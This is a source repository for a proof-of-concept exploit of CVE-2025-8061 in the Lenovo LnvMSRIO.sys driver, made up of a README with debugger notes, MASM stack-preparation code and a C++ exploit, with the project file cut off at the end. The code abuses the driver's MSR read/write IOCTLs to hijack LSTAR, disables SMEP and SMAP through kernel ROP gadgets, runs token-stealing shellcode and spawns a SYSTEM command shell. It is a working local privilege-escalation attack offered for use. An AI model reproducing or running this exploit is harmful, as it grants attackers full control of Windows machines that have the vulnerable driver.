Project Path: arc_symeonp_Lenovo-CVE-2025-8061_lg6ezu65

Source Tree:

```txt
arc_symeonp_Lenovo-CVE-2025-8061_lg6ezu65
├── README.md
├── lenovo-sys.png
├── lenovopoc
│   ├── Header.h
│   ├── PrepareStack.asm
│   ├── lenovopoc.cpp
│   ├── lenovopoc.vcxproj
│   ├── lenovopoc.vcxproj.filters
│   ├── lenovopoc.vcxproj.user
│   └── x64
│       └── Debug
│           ├── PrepareStack.obj
│           ├── lenovopoc.Build.CppClean.log
│           ├── lenovopoc.exe.recipe
│           ├── lenovopoc.ilk
│           ├── lenovopoc.log
│           ├── lenovopoc.obj
│           ├── lenovopoc.tlog
│           │   ├── CL.command.1.tlog
│           │   ├── CL.read.1.tlog
│           │   ├── CL.write.1.tlog
│           │   ├── Cl.items.tlog
│           │   ├── Masm.read.1u.tlog
│           │   ├── Masm.write.1u.tlog
│           │   ├── lenovopoc.lastbuildstate
│           │   ├── link.command.1.tlog
│           │   ├── link.read.1.tlog
│           │   ├── link.secondary.1.tlog
│           │   └── link.write.1.tlog
│           ├── lenovopoc.vcxproj.FileListAbsolute.txt
│           ├── vc143.idb
│           └── vc143.pdb
├── lenovopoc.sln
└── swapgs.png

```

`README.md`:

```md
![System shell.](lenovo-sys.png)


# Lenovo-CVE-2025-8061
PoC for popping a system shell against the LnvMSRIO.sys (3.1.0.36) driver.
 All credits go to the original author [Luis Casvella from Quarkslab](https://blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061.html).
 This works against latest Windows 11 Version 24H2 (with KVAShadowing and Core Isolation disabled!)

> [!NOTE]
> This was compiled using latest Visual Studio 22.

## Useful notes for exploitation

> [!CAUTION]
> The offsets for this exploit are hardcoded for Windows version: Edition build lab: 26100.1.amd64fre.ge_release.240331-1435.
> As such you *need* to modify/debug your system since they will be different than the ones I've used for this.

The `KiSystemCall64` offset was obviously different to the author's one:

`#define FUNCTION_OFFSET__KISYSTEMCALL64     0x6b2b40  // nt!KiSystemCall64 offset`

```
0: kd> rdmsr c0000082
msr[c0000082] = fffff801`e76b2b40
0: kd> ? fffff801`e76b2b40 - nt
Evaluate expression: 7023424 = 00000000`006b2b40
```

## Disabling SMEP

The current value of the `cr4` register for my system was `0x00350EF8`
As such in order to disable SMEP you need the bit 20 *cleared*:

```
0x350ef8 = 0011 0101 0000 1110 1111 1000
Bit 20 (SMEP) = 1 (enabled)
```

So to find out the correct value:
`0x350ef8 & ~0x100000 = 0x250ef8`

Verify Your System's CR4
First check what CR4 value your system should have:
```r cr4
? cr4 & 0x100000   ; Check if bit 20 is set
```

Very important in the return to user mode shellcoding section make sure you restore it to its *original* value!

## ASLR Bypass.

Using a different machine:

```
6: kd> r cr4
cr4=0000000000370678
6: kd> rdmsr C0000082
msr[c0000082] = fffff803`88d7a200
6: kd> u fffff803`88d7a200
nt!KiSystemCall64Shadow:
fffff803`88d7a200 0f01f8          swapgs
fffff803`88d7a203 654889242510b00000 mov   qword ptr gs:[0B010h],rsp
fffff803`88d7a20c 65488b242500b00000 mov   rsp,qword ptr gs:[0B000h]
--snip--
6: kd> ? fffff803`88d7a200 - nt
Evaluate expression: 12034560 = 00000000`00b7a200
```
As you can see these are all different and technically there's no ASLR bypass here (meh)..
Techniques to research:

```
1. Signature Scanning 
Once you have KiSystemCall64Shadow address from LSTAR, scan backwards or forwards for known byte patterns that are stable across versions. For example:

// KiSystemCall64Shadow always starts with: swapgs (0f 01 f8)
// Verify you have the right address
if (memcmp(leaked_address, "\x0f\x01\xf8", 3) != 0) {
    // Invalid - adjust offset
}

// Then scan for other gadgets relative to this known point
// For example, find "pop rcx; ret" pattern: 59 c3

2. Use Known Offsets Between Functions
Some offsets between kernel functions are more stable. Once you have KiSystemCall64Shadow:

// KiSystemCall64 is usually nearby (a few KB away)
// Scan the region for the standard KiSystemCall64 prologue
// Search for: 0f 01 f8 65 48 89 24 25 (swapgs + mov gs:[...], rsp)
```

## Token stealing shellcode.
Since again am using a different version I had to slightly modify that shellcode:

```
    unsigned char tokenSteal[] = {
        0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  // mov rax, gs:[0x188]
        0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00,              // mov rax, [rax+0x220] <- Changed from 0xb8
        0x49, 0x89, 0xC0,                                       // mov r8, rax
        0x4D, 0x8B, 0x80, 0xD8, 0x01, 0x00, 0x00,              // mov r8, [r8+0x1d8]
        0x49, 0x81, 0xE8, 0xD8, 0x01, 0x00, 0x00,              // sub r8, 0x1d8
        0x4D, 0x8B, 0x88, 0xD0, 0x01, 0x00, 0x00,              // mov r9, [r8+0x1d0]
        0x49, 0x83, 0xF9, 0x04,                                 // cmp r9, 4
        0x75, 0xE5,                                             // jne (loop back)
        0x49, 0x8B, 0x88, 0x48, 0x02, 0x00, 0x00,              // mov rcx, [r8+0x248]
        0x80, 0xE1, 0xF0,                                       // and cl, 0xf0
        0x48, 0x89, 0x88, 0x48, 0x02, 0x00, 0x00               // mov [rax+0x248], rcx
    };
```

For these you need to check the following structures and adjust:
```
0: kd> dt nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : Ptr64 _KGDTENTRY64
   +0x008 TssBase          : Ptr64 _KTSS64
   +0x010 UserRsp          : Uint8B
   +0x018 Self             : Ptr64 _KPCR
   +0x020 CurrentPrcb      : Ptr64 _KPRCB
   +0x028 LockArray        : Ptr64 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : Ptr64 Void
   +0x038 IdtBase          : Ptr64 _KIDTENTRY64
   +0x040 Unused           : [2] Uint8B
   +0x050 Irql             : UChar
   +0x051 SecondLevelCacheAssociativity : UChar
   +0x052 ObsoleteNumber   : UChar
   +0x053 Fill0            : UChar
   +0x054 Unused0          : [3] Uint4B
   +0x060 MajorVersion     : Uint2B
   +0x062 MinorVersion     : Uint2B
   +0x064 StallScaleFactor : Uint4B
   +0x068 Unused1          : [3] Ptr64 Void
   +0x080 KernelReserved   : [15] Uint4B
   +0x0bc SecondLevelCacheSize : Uint4B
   +0x0c0 HalReserved      : [16] Uint4B
   +0x100 Unused2          : Uint4B
   +0x108 KdVersionBlock   : Ptr64 Void
   +0x110 Unused3          : Ptr64 Void
   +0x118 PcrAlign1        : [24] Uint4B
   +0x180 Prcb             : _KPRCB
0: kd> dt nt!_EPROCESS ActiveProcessLinks
   +0x1d8 ActiveProcessLinks : _LIST_ENTRY
0: kd> dt nt!_EPROCESS UniqueProcessId 
   +0x1d0 UniqueProcessId : Ptr64 Void
0: kd> dt nt!_EPROCESS Token
   +0x248 Token : _EX_FAST_REF
0: kd> dt nt!_KTHREAD Process
   +0x220 Process : Ptr64 _KPROCESS
0: kd> dt nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : Ptr64 _KGDTENTRY64
   +0x008 TssBase          : Ptr64 _KTSS64
   +0x010 UserRsp          : Uint8B
   +0x018 Self             : Ptr64 _KPCR
   +0x020 CurrentPrcb      : Ptr64 _KPRCB
   +0x028 LockArray        : Ptr64 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : Ptr64 Void
   +0x038 IdtBase          : Ptr64 _KIDTENTRY64
   +0x040 Unused           : [2] Uint8B
   +0x050 Irql             : UChar
   +0x051 SecondLevelCacheAssociativity : UChar
   +0x052 ObsoleteNumber   : UChar
   +0x053 Fill0            : UChar
   +0x054 Unused0          : [3] Uint4B
   +0x060 MajorVersion     : Uint2B
   +0x062 MinorVersion     : Uint2B
   +0x064 StallScaleFactor : Uint4B
   +0x068 Unused1          : [3] Ptr64 Void
   +0x080 KernelReserved   : [15] Uint4B
   +0x0bc SecondLevelCacheSize : Uint4B
   +0x0c0 HalReserved      : [16] Uint4B
   +0x100 Unused2          : Uint4B
   +0x108 KdVersionBlock   : Ptr64 Void
   +0x110 Unused3          : Ptr64 Void
   +0x118 PcrAlign1        : [24] Uint4B
   +0x180 Prcb             : _KPRCB
0: kd> dt nt!_KPRCB CurrentThread
   +0x008 CurrentThread : Ptr64 _KTHREAD
```

## swapgs syscall

Right before executing the `swapgs` it's very important that `rcx` points back to the main so execution can continue.
Failing to do that it will make your VM freeze!

![Executing the swapgs instruction.](swapgs.png)

## rdmsr c0000082 address

Make *sure* you also restore this value to its original one. Failing to do that will also freeze the VM once again :)

## TODO

- [ ] Find more generic ways to obtain the gadgets using the MSR LSTAR arbitrary read!
- [ ] As per comment on twitter, find out how to use the low stub method to read CR3 register. And then we can convert VA to PA.
```

`lenovopoc.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.14.36119.2 d17.14
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "lenovopoc", "lenovopoc\lenovopoc.vcxproj", "{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}.Debug|x64.ActiveCfg = Debug|x64
		{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}.Debug|x64.Build.0 = Debug|x64
		{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}.Debug|x86.ActiveCfg = Debug|Win32
		{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}.Debug|x86.Build.0 = Debug|Win32
		{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}.Release|x64.ActiveCfg = Release|x64
		{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}.Release|x64.Build.0 = Release|x64
		{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}.Release|x86.ActiveCfg = Release|Win32
		{F123D3E4-E6CA-444E-A1E7-4981815DAAC5}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {95804076-A572-4202-A2D7-9E5BD73DE916}
	EndGlobalSection
EndGlobal

```

`lenovopoc/Header.h`:

```h
#pragma once

```

`lenovopoc/PrepareStack.asm`:

```asm
public PrepareStack

.CODE

ALIGN 16
PrepareStack PROC
    pushfq           ; Save current RFLAGS
    pop r12          ; Store RFLAGS in r12
    
    ; Save the return address (where we came from in usermode)
    pop r13          ; Pop return address into r13
    
    sub rsp, 16      
    xor rbx, rbx     
    sub rbx, 16      
    and rsp, rbx     ; Align stack to 16 bytes
    
    ; Build post-iretq stack
    push r13         ; Push saved return address (where to return after exploit)
    push rcx         ; Shellcode address
    push rdx         ; mov cr4,rcx gadget
    push 0250ef8h    ; CR4 value
    
    mov rbx, 18h     ; SS
    push rbx         
    
    mov rbx, rsp     
    add rbx, 8
    push rbx         ; RSP after iretq
    
    pushfq           
    pop rbx          
    and rbx, 0FFh    
    or rbx, 040000h  ; Disable SMAP
    push rbx         ; RFLAGS
    push rbx         
    popfq            
    
    mov rbx, 10h     ; CS
    push rbx         
    
    mov rcx, 0250ef8h
    push r8          ; pop rcx;ret gadget
    
    syscall
PrepareStack ENDP

END

; credits & thanks : Modified asm code (to fit with most recent windows build) from this blogpost => https://idafchev.github.io/blog/wrmsr/
```

`lenovopoc/lenovopoc.cpp`:

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include <inttypes.h>  // for PRIu64/PRIxPTR etc.

#define DEVICE_NAME L"\\\\.\\WinMsrDev"
#define IOCTL_READ_MSR 0x9c402084
#define IOCTL_WRITE_MSR 0x9C402088
#define MSR_LSTAR 0xC0000082


#define GADGET_OFFSET__SWAPGS_IRETQ         0xbabc22  // Find with: s -b nt L?7fffffff 0f 01 f8 48 cf
#define GADGET_OFFSET__MOV_CR4_RCX_RET      0x4ac657  // Find with: s -b nt L?7fffffff 0f 22 e1 c3
#define GADGET_OFFSET__POP_RCX_RET          0x727927  // Find with: s -b nt L?7fffffff 59 c3
#define GADGET_OFFSET__SWAPGS_SYSRET_RET    0xbabe2e  // Find with: s -b nt L?7fffffff 0f 01 f8 48 0f 07
#define FUNCTION_OFFSET__KISYSTEMCALL64     0x6b2b40  // nt!KiSystemCall64 offset

// External ASM function
extern "C" void PrepareStack(uint64_t shellcode_addr,
    uint64_t cr4_gadget,
    uint64_t poprcx_gadget);

typedef struct IRP_STRUCT_READ_MSR {
    int Register;
} IRP_STRUCT_READ_MSR, * PIRP_STRUCT_READ_MSR;

#pragma pack(push, 1)
typedef struct _IRP_STRUCT_WRITE_MSR {
    uint32_t Register;
    uint64_t Value;
} IRP_STRUCT_WRITE_MSR;
#pragma pack(pop)

uint64_t qKiSystemCall64Address = 0;
uint64_t qKernelBaseAddress = 0;
uint64_t qGadget_swapgs_iretq = 0;
uint64_t qGadget_movcr4_rcx__ret = 0;
uint64_t qGadget_poprcx_ret = 0;
uint64_t qGadget_swapgs_sysret_ret = 0;

BOOL WriteMSR(HANDLE hDevice, uint32_t Register, uint64_t Value) {
    IRP_STRUCT_WRITE_MSR inputBuffer = { 0 };
    inputBuffer.Register = Register;
    inputBuffer.Value = Value;

    DWORD bytesReturned = 0;
    return DeviceIoControl(hDevice, IOCTL_WRITE_MSR, &inputBuffer,
        sizeof(inputBuffer), NULL, 0, &bytesReturned, NULL);
}

uint64_t ReadMSR(HANDLE hDevice, uint32_t Register) {
    PIRP_STRUCT_READ_MSR inputBuffer = (PIRP_STRUCT_READ_MSR)malloc(sizeof(IRP_STRUCT_READ_MSR));
    inputBuffer->Register = Register;

    DWORD bytesReturned = 0;
    uint64_t value = 0;

    BOOL success = DeviceIoControl(
        hDevice,                                            // Handle to the device
        IOCTL_READ_MSR,                                     // The IOCTL code for this operation
        inputBuffer,                                        // Input buffer
        sizeof(inputBuffer),                                // Input buffer size
        &value,                                             // Output buffer
        sizeof(uint64_t),                                   // Output buffer size
        &bytesReturned,                                     // Bytes returned
        NULL                                                // Overlapped
    );
    if (!success) {
        printf("DeviceIoControl failed with error: %d\n", GetLastError());
        exit(-1);
    }
    return value;
}

// Print a formatted hexdump: "address  hex-bytes...  |ascii...|"
// buf: pointer to buffer, len: number of bytes to print, baseAddr: optional base address to display (pass (uintptr_t)buf).
void hexdump(const void* buf, size_t len, uintptr_t baseAddr)
{
    const unsigned char* b = (const unsigned char*)buf;
    size_t off = 0;
    const size_t cols = 16;

    if (!buf) return;

    while (off < len) {
        // print address
        printf("%016" PRIxPTR "  ", (uintptr_t)(baseAddr + off));

        // print hex bytes
        for (size_t i = 0; i < cols; ++i) {
            if (off + i < len) {
                printf("%02X ", b[off + i]);
            }
            else {
                printf("   ");
            }
            if (i == 7) printf(" "); // additional space in middle
        }

        // print ascii column
        printf(" |");
        for (size_t i = 0; i < cols && off + i < len; ++i) {
            unsigned char ch = b[off + i];
            printf("%c", (isprint(ch) ? ch : '.'));
        }
        printf("|\n");

        off += cols;
    }
}


void PreparePayload(unsigned char* Payload) {
    int offset = 0;

    DWORD qKiSystemCall64Address_HighPart = qKiSystemCall64Address >> 0x20;
    DWORD qKiSystemCall64Address_LowPart = qKiSystemCall64Address & 0xffffffff;

    // 1. Restore LSTAR
    Payload[offset++] = 0xB9; // mov ecx, 0xC0000082
    *(DWORD*)&Payload[offset] = MSR_LSTAR;
    offset += 4;

    Payload[offset++] = 0xBA; // mov edx, high
    *(DWORD*)&Payload[offset] = qKiSystemCall64Address_HighPart;
    offset += 4;

    Payload[offset++] = 0xB8; // mov eax, low
    *(DWORD*)&Payload[offset] = qKiSystemCall64Address_LowPart;
    offset += 4;

    Payload[offset++] = 0x0F; // wrmsr
    Payload[offset++] = 0x30;

    // 2. Token stealing shellcode
    unsigned char tokenSteal[] = {
        0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,  // mov rax, gs:[0x188]
        0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00,              // mov rax, [rax+0x220] <- Changed from 0xb8
        0x49, 0x89, 0xC0,                                       // mov r8, rax
        0x4D, 0x8B, 0x80, 0xD8, 0x01, 0x00, 0x00,              // mov r8, [r8+0x1d8]
        0x49, 0x81, 0xE8, 0xD8, 0x01, 0x00, 0x00,              // sub r8, 0x1d8
        0x4D, 0x8B, 0x88, 0xD0, 0x01, 0x00, 0x00,              // mov r9, [r8+0x1d0]
        0x49, 0x83, 0xF9, 0x04,                                 // cmp r9, 4
        0x75, 0xE5,                                             // jne (loop back)
        0x49, 0x8B, 0x88, 0x48, 0x02, 0x00, 0x00,              // mov rcx, [r8+0x248]
        0x80, 0xE1, 0xF0,                                       // and cl, 0xf0
        0x48, 0x89, 0x88, 0x48, 0x02, 0x00, 0x00               // mov [rax+0x248], rcx
    };
    memcpy(&Payload[offset], tokenSteal, sizeof(tokenSteal));
    offset += sizeof(tokenSteal);

    // 3. Return to usermode
    // add rsp, 0x18 ; Restore stack
    Payload[offset++] = 0x48;
    Payload[offset++] = 0x83;
    Payload[offset++] = 0xC4;
    Payload[offset++] = 0x18;

    // pop rcx ; return address to main()
    // Payload[offset++] = 0x59;
    // mov rcx, r13 ; restore return address from r13
    Payload[offset++] = 0x4C;  // mov rcx, r13
    Payload[offset++] = 0x89;
    Payload[offset++] = 0xE9;

    // movabs rdx, gadget_swapgs_sysret_ret
    Payload[offset++] = 0x48;
    Payload[offset++] = 0xBA;
    *(uint64_t*)&Payload[offset] = qGadget_swapgs_sysret_ret;
    offset += 8;

    // push rdx
    Payload[offset++] = 0x52;

    // push rcx
    Payload[offset++] = 0x51;

    // movabs rdx, qGadget_poprcx_ret
    Payload[offset++] = 0x48;
    Payload[offset++] = 0xBA;
    *(uint64_t*)&Payload[offset] = qGadget_poprcx_ret;
    offset += 8;

    // push rdx
    Payload[offset++] = 0x52;

    // movabs rdx, qGadget_movcr4_rcx__ret
    Payload[offset++] = 0x48;
    Payload[offset++] = 0xBA;
    *(uint64_t*)&Payload[offset] = qGadget_movcr4_rcx__ret;
    offset += 8;

    // push rdx
    Payload[offset++] = 0x52;

    // push CR4_value
    Payload[offset++] = 0x68;
    *(DWORD*)&Payload[offset] = 0x00350EF8;
    offset += 4;

    // movabs rdx, qGadget_poprcx_ret
    Payload[offset++] = 0x48;
    Payload[offset++] = 0xBA;
    *(uint64_t*)&Payload[offset] = qGadget_poprcx_ret;
    offset += 8;

    // push rdx
    Payload[offset++] = 0x52;

    // mov r11, r12 ; restore RFLAGS
    Payload[offset++] = 0x4D;
    Payload[offset++] = 0x89;
    Payload[offset++] = 0xE3;

    // ret
    Payload[offset++] = 0xC3;

    printf("[+] Shellcode length: %d bytes\n", offset);
}


int SpawnCmd(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BOOL ok;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    ok = CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe", // lpApplicationName
        NULL,                             // lpCommandLine (NULL -> uses application)
        NULL,                             // lpProcessAttributes
        NULL,                             // lpThreadAttributes
        FALSE,                            // bInheritHandles
        0,                                // dwCreationFlags
        NULL,                             // lpEnvironment
        NULL,                             // lpCurrentDirectory
        &si,                              // lpStartupInfo
        &pi                               // lpProcessInformation
    );

    if (!ok) {
        DWORD err = GetLastError();
        fprintf(stderr, "CreateProcess failed (error %lu)\n", err);
        return -1;
    }

    // Close thread handle; optionally wait or keep process handle if you need it
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}

void ExploitWriteMSRPrimitive(HANDLE hDevice) {
      
    // 2. Leak LSTAR
    printf("[*] Leak MSR LSTAR value with MSR read primitive\n");
    uint64_t MSRLSTAR_InitialValue = ReadMSR(hDevice, MSR_LSTAR);
    assert(MSRLSTAR_InitialValue != 0);
    qKiSystemCall64Address = MSRLSTAR_InitialValue;
    assert(qKiSystemCall64Address != 0);
    printf("\t[*] KiSystemCall64 at 0x%llX\n", qKiSystemCall64Address);

    // 3. Calculate gadget addresses
    qKernelBaseAddress = qKiSystemCall64Address - FUNCTION_OFFSET__KISYSTEMCALL64;
    printf("[+] Kernel base at 0x%llx\n", qKernelBaseAddress);

    qGadget_swapgs_iretq = qKernelBaseAddress + GADGET_OFFSET__SWAPGS_IRETQ;
    qGadget_movcr4_rcx__ret = qKernelBaseAddress + GADGET_OFFSET__MOV_CR4_RCX_RET;
    qGadget_poprcx_ret = qKernelBaseAddress + GADGET_OFFSET__POP_RCX_RET;
    qGadget_swapgs_sysret_ret = qKernelBaseAddress + GADGET_OFFSET__SWAPGS_SYSRET_RET;

    printf("[+] Gadget swapgs;iretq at 0x%llx\n", qGadget_swapgs_iretq);

    /* 4 - Set current thread to High Priority */
    /* 4.1 - Save old priority */
    HANDLE hProcess = GetCurrentProcess();
    HANDLE hThread = GetCurrentThread();
    DWORD dOldPriorityClass = GetPriorityClass(hProcess);
    DWORD dOldThreadPriority = GetThreadPriority(hThread);

    /* 4.2 - Set new priority */
    BOOL bStatusPriorityClass = SetPriorityClass(hProcess, REALTIME_PRIORITY_CLASS);
    assert(bStatusPriorityClass != false);
    printf("[*] Set current process to real time priority\n");

    BOOL bStatusThreadPriority = SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);
    assert(bStatusThreadPriority != false);
    printf("[*] Set current thread to critical time priority\n");

    // 5. Allocate and prepare shellcode
    unsigned char* Payload = (unsigned char*)VirtualAlloc(NULL, 500,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    RtlFillMemory(Payload, 500, 0x90);
    PreparePayload(Payload);
    printf("[+] Shellcode at 0x%p\n", Payload);

    size_t pos = 144;
    // Show formatted dump using the payload's pointer as the base address
    hexdump(Payload, pos, (uintptr_t)Payload);
    printf("[!] Press Enter to exploit...\n");

    printf("[*] About to call PrepareStack:\n");
    printf("    Shellcode (rcx): 0x%llx\n", (uint64_t)Payload);
    printf("    mov cr4 (rdx):   0x%llx\n", qGadget_movcr4_rcx__ret);
    printf("    pop rcx (r8):    0x%llx\n", qGadget_poprcx_ret);
    getchar();

    printf("[*] Sending stage...\n\n");
    fflush(stdout);
    // 6. Overwrite LSTAR
    WriteMSR(hDevice, MSR_LSTAR, qGadget_swapgs_iretq);

    // 7. Execute with prepared stack
    PrepareStack((uint64_t)Payload, qGadget_movcr4_rcx__ret, qGadget_poprcx_ret);

    printf("[+] Exploit complete! Should be SYSTEM now\n");

    /* 8 - We should be SYSTEM */
    SpawnCmd(); //Create a cmd.exe process

    CloseHandle(hDevice);
}

HANDLE OpenDevice() {
    HANDLE hDevice = CreateFile(DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open device. Error: %d\n", GetLastError());
    }
    else {
        printf("[*] Device opened successfully.\n");
    }

    return hDevice;
}


int main() {

    // 1. Get driver handle
    HANDLE hDevice = OpenDevice();
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device\n");
        return 1;
    }
    printf("[+] Device handle: 0x%p\n", hDevice);
    ExploitWriteMSRPrimitive(hDevice);
    return 0;
}
```

`lenovopoc/lenovopoc.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{f123d3e4-e6ca-444e-a1e7-4981815daac5}</ProjectGuid>
    <RootNamespace>lenovopoc</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
